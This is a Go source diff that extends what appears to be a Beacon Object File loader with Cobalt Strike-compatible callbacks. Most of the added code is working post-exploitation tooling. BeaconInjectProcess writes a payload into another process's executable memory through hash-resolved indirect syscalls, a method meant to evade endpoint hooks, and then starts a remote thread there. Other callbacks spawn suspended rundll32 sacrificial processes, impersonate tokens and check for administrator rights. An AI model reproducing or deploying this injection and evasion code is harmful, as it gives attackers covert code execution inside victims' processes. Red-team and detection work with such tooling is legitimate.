@@ -6,40 +6,80 @@ import (
 	"sync"
 	"syscall"
 	"unsafe"
+
+	wc "github.com/carved4/go-wincall"
 )
 
 var (
-	bofOutput struct {
+	bofOutput	struct {
 		sync.Mutex
-		buf []byte
-		len int
+		buf	[]byte
+		len	int
 	}
 
-	keyStore     = make(map[string]uintptr)
-	keyStoreLock sync.Mutex
+	keyStore	= make(map[string]uintptr)
+	keyStoreLock	sync.Mutex
 
-	emptyStringBuf = []byte{0, 0, 0, 0}
+	emptyStringBuf	= []byte{0, 0, 0, 0}
 
-	callbacksOnce       sync.Once
-	beaconOutputCb      uintptr
-	beaconPrintfCb      uintptr
-	beaconDataParseCb   uintptr
-	beaconDataIntCb     uintptr
-	beaconDataShortCb   uintptr
-	beaconDataLengthCb  uintptr
-	beaconDataExtractCb uintptr
-	beaconAddValueCb    uintptr
-	beaconGetValueCb    uintptr
-	beaconRemoveValueCb uintptr
-	toWideCharCb        uintptr
-	genericStubCb       uintptr
+	callbacksOnce		sync.Once
+	beaconOutputCb		uintptr
+	beaconPrintfCb		uintptr
+	beaconDataParseCb	uintptr
+	beaconDataIntCb		uintptr
+	beaconDataShortCb	uintptr
+	beaconDataLengthCb	uintptr
+	beaconDataExtractCb	uintptr
+	beaconAddValueCb	uintptr
+	beaconGetValueCb	uintptr
+	beaconRemoveValueCb	uintptr
+	toWideCharCb		uintptr
+	genericStubCb		uintptr
+
+	beaconFormatAllocCb	uintptr
+	beaconFormatResetCb	uintptr
+	beaconFormatFreeCb	uintptr
+	beaconFormatAppendCb	uintptr
+	beaconFormatPrintfCb	uintptr
+	beaconFormatToStringCb	uintptr
+	beaconFormatIntCb	uintptr
+	beaconUseTokenCb	uintptr
+	beaconRevertTokenCb	uintptr
+	beaconIsAdminCb		uintptr
+	beaconGetSpawnToCb	uintptr
+	beaconSpawnTempProcCb	uintptr
+	beaconInjectProcCb	uintptr
+	beaconInjectTempProcCb	uintptr
+	beaconCleanupProcCb	uintptr
+	beaconGetOutputDataCb	uintptr
+	beaconInformationCb	uintptr
+
+	formatBuffers		= make(map[uintptr]*formatBuffer)
+	formatBuffersLock	sync.Mutex
+	formatBufferIdSeq	uintptr	= 0x10000
+
+	currentToken		uintptr
+	currentTokenLock	sync.Mutex
 )
 
 type datap struct {
-	original uintptr
-	buffer   uintptr
-	length   uint32
-	size     uint32
+	original	uintptr
+	buffer		uintptr
+	length		uint32
+	size		uint32
+}
+
+type formatBuffer struct {
+	id		uintptr
+	data		[]byte
+	capacity	int
+}
+
+type formatp struct {
+	original	uintptr
+	buffer		uintptr
+	length		uint32
+	size		uint32
 }
 
 func initCallbacks() {
@@ -56,6 +96,24 @@ func initCallbacks() {
 		beaconRemoveValueCb = syscall.NewCallback(beaconRemoveValueCallback)
 		toWideCharCb = syscall.NewCallback(toWideCharCallback)
 		genericStubCb = syscall.NewCallback(genericStubCallback)
+
+		beaconFormatAllocCb = syscall.NewCallback(beaconFormatAllocCallback)
+		beaconFormatResetCb = syscall.NewCallback(beaconFormatResetCallback)
+		beaconFormatFreeCb = syscall.NewCallback(beaconFormatFreeCallback)
+		beaconFormatAppendCb = syscall.NewCallback(beaconFormatAppendCallback)
+		beaconFormatPrintfCb = syscall.NewCallback(beaconFormatPrintfCallback)
+		beaconFormatToStringCb = syscall.NewCallback(beaconFormatToStringCallback)
+		beaconFormatIntCb = syscall.NewCallback(beaconFormatIntCallback)
+		beaconUseTokenCb = syscall.NewCallback(beaconUseTokenCallback)
+		beaconRevertTokenCb = syscall.NewCallback(beaconRevertTokenCallback)
+		beaconIsAdminCb = syscall.NewCallback(beaconIsAdminCallback)
+		beaconGetSpawnToCb = syscall.NewCallback(beaconGetSpawnToCallback)
+		beaconSpawnTempProcCb = syscall.NewCallback(beaconSpawnTemporaryProcessCallback)
+		beaconInjectProcCb = syscall.NewCallback(beaconInjectProcessCallback)
+		beaconInjectTempProcCb = syscall.NewCallback(beaconInjectTemporaryProcessCallback)
+		beaconCleanupProcCb = syscall.NewCallback(beaconCleanupProcessCallback)
+		beaconGetOutputDataCb = syscall.NewCallback(beaconGetOutputDataCallback)
+		beaconInformationCb = syscall.NewCallback(beaconInformationCallback)
 	})
 }
 
@@ -307,7 +365,6 @@ func processFormatString(format string, args []uintptr) string {
 					i++
 				}
 			default:
-				// Unknown specifier, skip it but consume an arg
 				if argIdx < len(args) {
 					result += fmt.Sprintf("%v", args[argIdx])
 					argIdx++
@@ -510,6 +567,497 @@ func genericStubCallback() uintptr {
 	return 0
 }
 
+func beaconFormatAllocCallback(formatPtr uintptr, maxsz int32) uintptr {
+	if formatPtr == 0 || maxsz <= 0 {
+		return 0
+	}
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	formatBufferIdSeq++
+	id := formatBufferIdSeq
+
+	fb := &formatBuffer{
+		id:		id,
+		data:		make([]byte, 0, maxsz),
+		capacity:	int(maxsz),
+	}
+	formatBuffers[id] = fb
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	fp.original = id
+	fp.buffer = id
+	fp.length = 0
+	fp.size = uint32(maxsz)
+
+	return 1
+}
+
+func beaconFormatResetCallback(formatPtr uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	if fb, exists := formatBuffers[id]; exists {
+		fb.data = fb.data[:0]
+		fp.length = 0
+	}
+
+	return 1
+}
+
+func beaconFormatFreeCallback(formatPtr uintptr) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	delete(formatBuffers, id)
+
+	fp.original = 0
+	fp.buffer = 0
+	fp.length = 0
+	fp.size = 0
+
+	return 1
+}
+
+func beaconFormatAppendCallback(formatPtr uintptr, data uintptr, length int32) uintptr {
+	if formatPtr == 0 || data == 0 || length <= 0 {
+		return 0
+	}
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	fb, exists := formatBuffers[id]
+	if !exists {
+		return 0
+	}
+
+	src := unsafe.Slice((*byte)(unsafe.Pointer(data)), length)
+	remaining := fb.capacity - len(fb.data)
+	toAppend := int(length)
+	if toAppend > remaining {
+		toAppend = remaining
+	}
+
+	if toAppend > 0 {
+		fb.data = append(fb.data, src[:toAppend]...)
+		fp.length = uint32(len(fb.data))
+	}
+
+	return 1
+}
+
+func beaconFormatPrintfCallback(formatPtr uintptr, fmtPtr uintptr,
+	arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9 uintptr) uintptr {
+	if formatPtr == 0 || fmtPtr == 0 {
+		return 0
+	}
+
+	fmtStr := readCString(fmtPtr)
+	if fmtStr == "" {
+		return 0
+	}
+
+	args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}
+	result := processFormatString(fmtStr, args)
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	fb, exists := formatBuffers[id]
+	if !exists {
+		return 0
+	}
+
+	remaining := fb.capacity - len(fb.data)
+	toAppend := len(result)
+	if toAppend > remaining {
+		toAppend = remaining
+	}
+
+	if toAppend > 0 {
+		fb.data = append(fb.data, result[:toAppend]...)
+		fp.length = uint32(len(fb.data))
+	}
+
+	return 1
+}
+
+func beaconFormatToStringCallback(formatPtr uintptr, outLen uintptr) uintptr {
+	if formatPtr == 0 {
+		if outLen != 0 {
+			*(*int32)(unsafe.Pointer(outLen)) = 0
+		}
+		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
+	}
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	fb, exists := formatBuffers[id]
+	if !exists || len(fb.data) == 0 {
+		if outLen != 0 {
+			*(*int32)(unsafe.Pointer(outLen)) = 0
+		}
+		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
+	}
+
+	if outLen != 0 {
+		*(*int32)(unsafe.Pointer(outLen)) = int32(len(fb.data))
+	}
+
+	return uintptr(unsafe.Pointer(&fb.data[0]))
+}
+
+func beaconFormatIntCallback(formatPtr uintptr, value int32) uintptr {
+	if formatPtr == 0 {
+		return 0
+	}
+
+	fp := (*formatp)(unsafe.Pointer(formatPtr))
+	id := fp.original
+
+	formatBuffersLock.Lock()
+	defer formatBuffersLock.Unlock()
+
+	fb, exists := formatBuffers[id]
+	if !exists {
+		return 0
+	}
+
+	remaining := fb.capacity - len(fb.data)
+	if remaining < 4 {
+		return 0
+	}
+
+	buf := make([]byte, 4)
+	binary.BigEndian.PutUint32(buf, uint32(value))
+	fb.data = append(fb.data, buf...)
+	fp.length = uint32(len(fb.data))
+
+	return 1
+}
+
+func beaconUseTokenCallback(token uintptr) uintptr {
+	if token == 0 {
+		return 0
+	}
+
+	currentTokenLock.Lock()
+	defer currentTokenLock.Unlock()
+
+	currThread, _, _ := wc.Call("kernel32.dll", "GetCurrentThread")
+	ret, _, _ := wc.Call("advapi32.dll", "SetThreadToken", uintptr(unsafe.Pointer(&currThread)), token)
+	if ret == 0 {
+		return 0
+	}
+
+	currentToken = token
+	return 1
+}
+
+func beaconRevertTokenCallback() uintptr {
+	currentTokenLock.Lock()
+	defer currentTokenLock.Unlock()
+
+	currThread, _, _ := wc.Call("kernel32.dll", "GetCurrentThread")
+	wc.Call("advapi32.dll", "SetThreadToken", uintptr(unsafe.Pointer(&currThread)), 0)
+	currentToken = 0
+
+	return 1
+}
+
+func beaconIsAdminCallback() uintptr {
+	var adminSid uintptr
+	var identAuth [6]byte
+	identAuth[5] = 5
+
+	ret, _, _ := wc.Call("advapi32.dll", "AllocateAndInitializeSid",
+		uintptr(unsafe.Pointer(&identAuth[0])),
+		2,
+		32,
+		544,
+		0, 0, 0, 0, 0, 0,
+		uintptr(unsafe.Pointer(&adminSid)))
+
+	if ret == 0 || adminSid == 0 {
+		return 0
+	}
+
+	defer wc.Call("advapi32.dll", "FreeSid", adminSid)
+
+	var isMember int32
+	ret, _, _ = wc.Call("advapi32.dll", "CheckTokenMembership",
+		0,
+		adminSid,
+		uintptr(unsafe.Pointer(&isMember)))
+
+	if ret != 0 && isMember != 0 {
+		return 1
+	}
+
+	return 0
+}
+
+func beaconGetSpawnToCallback(x86 int32, buffer uintptr, maxLen int32) uintptr {
+	if buffer == 0 || maxLen <= 0 {
+		return 0
+	}
+
+	var spawnTo string
+	if x86 != 0 {
+		spawnTo = "C:\\Windows\\SysWOW64\\rundll32.exe"
+	} else {
+		spawnTo = "C:\\Windows\\System32\\rundll32.exe"
+	}
+
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(buffer)), maxLen)
+	copyLen := len(spawnTo)
+	if copyLen >= int(maxLen) {
+		copyLen = int(maxLen) - 1
+	}
+	copy(dst, spawnTo[:copyLen])
+	dst[copyLen] = 0
+
+	return 1
+}
+
+func beaconSpawnTemporaryProcessCallback(x86 int32, ignoreToken int32, startupInfo uintptr, processInfo uintptr) uintptr {
+	if startupInfo == 0 || processInfo == 0 {
+		return 0
+	}
+
+	var spawnTo string
+	if x86 != 0 {
+		spawnTo = "C:\\Windows\\SysWOW64\\rundll32.exe"
+	} else {
+		spawnTo = "C:\\Windows\\System32\\rundll32.exe"
+	}
+
+	cmdLine := make([]uint16, len(spawnTo)+1)
+	for i, c := range spawnTo {
+		cmdLine[i] = uint16(c)
+	}
+
+	var createFlags uint32 = 0x00000004
+
+	currentTokenLock.Lock()
+	token := currentToken
+	currentTokenLock.Unlock()
+
+	var ret uintptr
+	if token != 0 && ignoreToken == 0 {
+		ret, _, _ = wc.Call("advapi32.dll", "CreateProcessAsUserW",
+			token,
+			0,
+			uintptr(unsafe.Pointer(&cmdLine[0])),
+			0, 0, 0,
+			uintptr(createFlags),
+			0, 0,
+			startupInfo,
+			processInfo)
+	} else {
+		ret, _, _ = wc.Call("kernel32.dll", "CreateProcessW",
+			0,
+			uintptr(unsafe.Pointer(&cmdLine[0])),
+			0, 0, 0,
+			uintptr(createFlags),
+			0, 0,
+			startupInfo,
+			processInfo)
+	}
+
+	if ret == 0 {
+		return 0
+	}
+
+	return 1
+}
+
+func beaconInjectProcessCallback(hProcess uintptr, pid int32, payload uintptr, payloadLen int32, offset int32, arg uintptr, argLen int32) uintptr {
+	if payload == 0 || payloadLen <= 0 {
+		return 0
+	}
+
+	targetProc := hProcess
+	if targetProc == 0 && pid > 0 {
+		targetProc, _, _ = wc.Call("kernel32.dll", "OpenProcess", 0x001FFFFF, 0, uintptr(pid))
+		if targetProc == 0 {
+			return 0
+		}
+		defer wc.Call("kernel32.dll", "CloseHandle", targetProc)
+	}
+
+	if targetProc == 0 {
+		return 0
+	}
+
+	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
+	var remoteAddr uintptr
+	regionSize := uintptr(payloadLen)
+	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
+		targetProc, uintptr(unsafe.Pointer(&remoteAddr)), 0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		0x00001000|0x00002000, 0x40)
+	if ret != 0 || remoteAddr == 0 {
+		return 0
+	}
+
+	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
+	var written uintptr
+	ret, _ = wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
+		targetProc, remoteAddr, payload, uintptr(payloadLen), uintptr(unsafe.Pointer(&written)))
+	if ret != 0 {
+		return 0
+	}
+
+	var threadId uintptr
+	hThread, _, _ := wc.Call("kernel32.dll", "CreateRemoteThread",
+		targetProc, 0, 0, remoteAddr+uintptr(offset), arg, 0, uintptr(unsafe.Pointer(&threadId)))
+	if hThread == 0 {
+		return 0
+	}
+
+	wc.Call("kernel32.dll", "CloseHandle", hThread)
+
+	return 1
+}
+
+func beaconInjectTemporaryProcessCallback(processInfo uintptr, payload uintptr, payloadLen int32, offset int32, arg uintptr, argLen int32) uintptr {
+	if processInfo == 0 || payload == 0 || payloadLen <= 0 {
+		return 0
+	}
+
+	hProcess := *(*uintptr)(unsafe.Pointer(processInfo))
+	if hProcess == 0 {
+		return 0
+	}
+
+	return beaconInjectProcessCallback(hProcess, 0, payload, payloadLen, offset, arg, argLen)
+}
+
+func beaconCleanupProcessCallback(processInfo uintptr) uintptr {
+	if processInfo == 0 {
+		return 0
+	}
+
+	hProcess := *(*uintptr)(unsafe.Pointer(processInfo))
+	hThread := *(*uintptr)(unsafe.Pointer(processInfo + 8))
+
+	if hThread != 0 {
+		wc.Call("kernel32.dll", "CloseHandle", hThread)
+		*(*uintptr)(unsafe.Pointer(processInfo + 8)) = 0
+	}
+
+	if hProcess != 0 {
+		wc.Call("kernel32.dll", "CloseHandle", hProcess)
+		*(*uintptr)(unsafe.Pointer(processInfo)) = 0
+	}
+
+	return 1
+}
+
+func beaconGetOutputDataCallback(outData uintptr, outLen uintptr) uintptr {
+	bofOutput.Lock()
+	defer bofOutput.Unlock()
+
+	if bofOutput.buf == nil || bofOutput.len == 0 {
+		if outData != 0 {
+			*(*uintptr)(unsafe.Pointer(outData)) = 0
+		}
+		if outLen != 0 {
+			*(*int32)(unsafe.Pointer(outLen)) = 0
+		}
+		return 0
+	}
+
+	if outData != 0 {
+		*(*uintptr)(unsafe.Pointer(outData)) = uintptr(unsafe.Pointer(&bofOutput.buf[0]))
+	}
+	if outLen != 0 {
+		*(*int32)(unsafe.Pointer(outLen)) = int32(bofOutput.len)
+	}
+
+	return 1
+}
+
+func beaconInformationCallback(info uintptr) uintptr {
+	if info == 0 {
+		return 0
+	}
+
+	pid, _, _ := wc.Call("kernel32.dll", "GetCurrentProcessId")
+	ppid := getParentPid()
+
+	infoStruct := (*struct {
+		Version		int32
+		Sleeptime	int32
+		Maxget		int32
+		x86		int32
+		Pid		int32
+		HighIntegrity	int32
+		Ppid		int32
+	})(unsafe.Pointer(info))
+
+	infoStruct.Version = 0x01
+	infoStruct.Sleeptime = 5000
+	infoStruct.Maxget = 1024 * 1024
+	infoStruct.x86 = 0
+	infoStruct.Pid = int32(pid)
+	infoStruct.HighIntegrity = int32(beaconIsAdminCallback())
+	infoStruct.Ppid = int32(ppid)
+
+	return 1
+}
+
+func getParentPid() uint32 {
+	type processBasicInfo struct {
+		Reserved1	uintptr
+		PebBaseAddress	uintptr
+		Reserved2	[2]uintptr
+		UniqueProcessId	uintptr
+		ParentPid	uintptr
+	}
+
+	var pbi processBasicInfo
+	var returnLength uint32
+
+	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
+	ntQueryInfo := wc.GetFunctionAddress(ntdll, wc.GetHash("NtQueryInformationProcess"))
+	if ntQueryInfo == 0 {
+		return 0
+	}
+
+	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
+	wc.CallG0(ntQueryInfo, currProc, 0, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)))
+
+	return uint32(pbi.ParentPid)
+}
+
 func readCString(ptr uintptr) string {
 	if ptr == 0 {
 		return ""
@@ -545,12 +1093,6 @@ func readWString(ptr uintptr) string {
 	return string(runes)
 }
 
-func copyMemory(dst, src uintptr, size uint32) {
-	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), size)
-	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), size)
-	copy(dstSlice, srcSlice)
-}
-
 func GetBeaconCallback(name string) uintptr {
 	initCallbacks()
 
@@ -577,6 +1119,40 @@ func GetBeaconCallback(name string) uintptr {
 		return beaconRemoveValueCb
 	case "toWideChar":
 		return toWideCharCb
+	case "BeaconFormatAlloc":
+		return beaconFormatAllocCb
+	case "BeaconFormatReset":
+		return beaconFormatResetCb
+	case "BeaconFormatFree":
+		return beaconFormatFreeCb
+	case "BeaconFormatAppend":
+		return beaconFormatAppendCb
+	case "BeaconFormatPrintf":
+		return beaconFormatPrintfCb
+	case "BeaconFormatToString":
+		return beaconFormatToStringCb
+	case "BeaconFormatInt":
+		return beaconFormatIntCb
+	case "BeaconUseToken":
+		return beaconUseTokenCb
+	case "BeaconRevertToken":
+		return beaconRevertTokenCb
+	case "BeaconIsAdmin":
+		return beaconIsAdminCb
+	case "BeaconGetSpawnTo":
+		return beaconGetSpawnToCb
+	case "BeaconSpawnTemporaryProcess":
+		return beaconSpawnTempProcCb
+	case "BeaconInjectProcess":
+		return beaconInjectProcCb
+	case "BeaconInjectTemporaryProcess":
+		return beaconInjectTempProcCb
+	case "BeaconCleanupProcess":
+		return beaconCleanupProcCb
+	case "BeaconGetOutputData":
+		return beaconGetOutputDataCb
+	case "BeaconInformation":
+		return beaconInformationCb
 	default:
 		return genericStubCb
 	}
@@ -694,3 +1270,4 @@ func packWideStringArg(s string) ([]byte, error) {
 	result = append(result, buf...)
 	return result, nil
 }
+
